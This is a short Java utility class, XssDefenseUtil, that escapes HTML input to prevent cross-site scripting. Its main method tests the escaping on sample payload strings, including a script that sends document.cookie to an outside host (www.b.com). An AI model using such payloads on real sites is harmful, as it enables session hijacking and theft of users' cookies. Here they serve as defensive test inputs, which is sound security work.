/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

package com.creditcloud.common.utils;

import org.apache.commons.lang3.StringEscapeUtils;

/**
 *
 * @author admin
 */
public class XssDefenseUtil {
    /**
     * 预防xss攻击对输入字符串转义
     * @param inputString 输入字符串
     * @return  转义后的字符串
     */
    public static String escapeHtml(String inputString){
        if(null!=inputString && !"".equals(inputString)){ // && inputString.contains("<script")
           return StringEscapeUtils.escapeHtml4(inputString);// 汉字会转换成对应的ASCII码，空格不转换
        }
        return inputString;
    }
    
    public static void main(String[] args){
        String inputString = "<script>window.location.href=\"http://www.baidu.com\";</script>";
        System.out.println(XssDefenseUtil.escapeHtml(inputString));
        inputString = "<</span></&";
        System.out.println(XssDefenseUtil.escapeHtml(inputString));
        inputString = "<script>window.open(\"www.b.com?param=\"+document.cookie)</script>";
        System.out.println(XssDefenseUtil.escapeHtml(inputString));
    }
}
